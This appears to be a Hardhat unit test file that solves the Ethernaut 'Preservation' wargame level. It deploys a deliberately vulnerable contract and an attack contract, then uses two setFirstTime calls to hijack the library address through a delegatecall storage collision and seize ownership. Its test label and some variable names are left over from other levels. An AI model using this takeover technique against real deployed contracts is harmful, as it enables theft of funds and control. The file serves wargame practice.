const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance
const bytes32 = ethers.utils.formatBytes32String

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_gatekeeptwo Unit Tests", function () {
        let owner, user1, user2, NaughtCoin
        beforeEach(async () => {
            ;[owner, user1, user2] = await ethers.getSigners()
            const LibraryContract = await ethers.getContractFactory(
                "LibraryContract"
            )
            const PreservationContract = await ethers.getContractFactory(
                "Preservation"
            )
            const PreservationAttackContract = await ethers.getContractFactory(
                "PreservationAttack"
            )

            const Library1 = await LibraryContract.deploy()
            const Library2 = await LibraryContract.deploy()
            Preservation = await PreservationContract.deploy(
                Library1.address,
                Library2.address
            )
            PreservationAttack = await PreservationAttackContract.deploy()
        })

        describe("break it", () => {
            it("default attack", async function () {
                // change the timeZone1Library address to attack address
                await Preservation.setFirstTime(PreservationAttack.address)
                expect(await Preservation.timeZone1Library()).to.equal(
                    PreservationAttack.address
                )
                // change owner to user1
                await Preservation.setFirstTime(user1.address)
                expect(await Preservation.owner()).to.equal(user1.address)
            })
        })
    })
}
